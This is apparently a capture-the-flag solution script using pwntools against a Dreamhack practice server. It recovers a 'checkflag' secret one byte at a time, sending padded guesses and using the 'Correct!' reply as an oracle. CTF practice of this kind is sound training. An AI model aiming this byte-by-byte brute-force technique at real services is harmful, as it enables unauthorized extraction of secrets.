from pwn import *


s = b""

for i in range(62, -1, -1):

    found = False
    for j in range(0x00, 0x7f):

        #p = process('./checkflag')
        p = remote('host3.dreamhack.games',21025)
        context.log_level = 'debug'
        p.recv()

        payload = b'A'*i
        payload += bytes(chr(j), 'ascii')
        payload += s
        payload += b'\x00'
        payload += b'A'*i
        p.send(payload)
        if (p.recvline() == b'Correct!\n'):
            found = True
            s = bytes(chr(j), 'ascii') + s
            break
        p.close()
    if not found:
        s = s + b'\x00'


print(s)
